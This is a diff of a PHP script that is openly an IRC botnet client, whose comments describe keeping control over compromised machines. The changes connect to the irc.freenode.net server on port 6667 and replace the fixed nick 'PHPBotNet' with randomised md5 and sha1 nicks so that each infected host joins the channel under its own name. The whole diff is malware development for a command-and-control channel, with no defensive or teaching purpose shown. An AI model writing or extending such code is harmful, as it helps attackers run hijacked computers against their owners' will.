@@ -9,6 +9,7 @@ ini_set('display_errors', 'on'); // We can see the output from the server.
 
 //Open socket to Freenode IRC Network.
 $socket = fsockopen("irc.freenode.net", 6667);
+// $socket = fsockopen("irc.freenode.net", 6697); See if this gets us to connect via SSL
 
 // Send text to the server: fputs();
 // fputs(socket variable aka where data needs to go, text that needs to be sent goes here.\n);
@@ -19,12 +20,20 @@ $socket = fsockopen("irc.freenode.net", 6667);
 
 // Each bot joining the channel needs a unique for us to keep control over the compromised machine.
 //The following code solves the problem. (I hope.)
-//$rand = getrandmax();
-//$nick = md5($rand);
+$rand = getrandmax();
+$nick = md5($rand);
+$better = mt_rand();
+$name = sha1($better);
+$real = sha1($rand);
+//$name = md5(getrandmax());
 
 
-fputs($socket, "NICK PHPBotNet\n");
-fputs($socket,"USER PHPBotNet anapnea.net PHPBotNet :kurtcc bruno\n"); //(nick host nick:realname)
+// This was working: fputs($socket, "NICK PHPBotNet\n");
+// This was also working: fputs($socket,"USER PHPBotNet anapnea.net PHPBotNet :kurtcc bruno\n"); //(nick host nick:realname)
+fputs($socket, "NICK $nick\n");
+fputs($socket,"USER $nick anapnea.net $nick :$name $real\n"); //(nick host nick:realname)
+
+
 
 // Join the channel of choice.
 // This variable should later be coded to be easily alternated
